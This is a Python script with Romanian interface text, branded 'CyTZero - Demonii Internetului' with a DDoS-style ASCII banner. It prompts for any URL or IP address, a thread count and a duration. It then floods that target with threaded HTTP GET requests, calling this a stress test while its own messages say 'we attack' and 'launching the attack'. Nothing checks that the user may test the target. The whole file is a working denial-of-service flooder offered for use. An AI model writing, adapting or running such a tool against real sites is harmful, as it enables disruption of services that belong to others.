import threading
import requests
import time
import cloudflare
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
from rich.panel import Panel
from rich.text import Text
from rich.theme import Theme

# Configurare tematică Rich pentru efecte dramatice
custom_theme = Theme({
    "warning": "bold red",
    "info": "bold cyan",
    "success": "bold green",
    "error": "bold magenta",
    "highlight": "bold red reverse",
})
console = Console(theme=custom_theme)

def send_request(target):
    """
    Trimite o cerere HTTP GET la URL-ul sau IP-ul specificat.
    """
    try:
        # Adaugăm "http://" automat dacă este nevoie
        if not target.startswith("http"):
            target = f"http://{target}"
        response = requests.get(target, timeout=5)
        console.log(f"[success][+][/success] [info]Răspuns {response.status_code}[/info] de la [bold cyan]{target}[/bold cyan]")
    except requests.exceptions.RequestException as e:
        console.log(f"[error][-][/error] [warning]Eroare: {e}[/warning]")

def stress_test(target, num_threads, duration):
    """
    Realizează testarea cu număr specificat de fire și durată.
    """
    console.print(
        Panel(
            Text(f"Pregătește-te! Atacăm {target} cu {num_threads} fire pentru {duration} secunde", justify="center"),
            border_style="red",
            title="[highlight]Testare Începută[/highlight]",
        )
    )

    start_time = time.time()
    threads = []

    with Progress(
        SpinnerColumn(style="red"),
        TextColumn("[warning]{task.description}[/warning]"),
        BarColumn(bar_width=None, style="red"),
        TimeElapsedColumn(),
        console=console
    ) as progress:
        task = progress.add_task("🔥 Lansez atacul...", total=None)
        while time.time() - start_time < duration:
            for _ in range(num_threads):
                thread = threading.Thread(target=send_request, args=(target,))
                threads.append(thread)
                thread.start()
            time.sleep(0.05)  # Evităm supraîncărcarea sistemului
        progress.remove_task(task)

    for thread in threads:
        thread.join()
    
    # Simulare de impact vizual la final
    console.print(
        Panel(
            Text("""
[bold red blink]
                   .-'      `-.
                 .'              `.
                /                  \
               ;                    ;
              |                      |
               \    \        /     /
                `.   `.____.'   .'
                  `-._      _.-'
                      `"""""" 
Testul s-a terminat. Rezistența serverului a fost testată![/bold red blink]""", justify="center"),
            border_style="red",
            title="[highlight]Finalizat[/highlight]",
        )
    )

if __name__ == "__main__":
    console.print(
        Panel(
            """
[bold red]                         )                  (     (           (     
   (          *   )  ( /(                  )\ )  )\ )        )\ )  
   )\  (    ` )  /(  )\())  (   (         (()/( (()/(       (()/(  
 (((_) )\ )  ( )(_))((_)\  ))\  )(    (    /(_)) /(_))   (   /(_)) 
 )\___(()/( (_(_())  _((_)/((_)(()\   )\  (_))_ (_))_    )\ (_))   
((/ __|)(_))|_   _| |_  /(_))   ((_) ((_)  |   \ |   \  ((_)/ __|  
 | (__| || |  | |    / / / -_) | '_|/ _ \  | |) || |) |/ _ \\__ \  
  \___|\_, |  |_|   /___|\___| |_|  \___/  |___/ |___/ \___/|___/  
       |__/                                                        [/bold red]
            """,
            border_style="bold red",
            title="[bold black on red] CyTZero - Demonii Internetului [/bold black on red]",
        )
    )
    
    # Introducerea parametrilor
    target = console.input("[warning]Introdu URL-ul sau adresa IP pentru testare: [/warning]").strip()
    num_threads = int(console.input("[warning]Numărul de fire de execuție (ex: 10): [/warning]"))
    duration = int(console.input("[warning]Durata testului (în secunde): [/warning]"))

    # Lansarea testului
    stress_test(target, num_threads, duration)
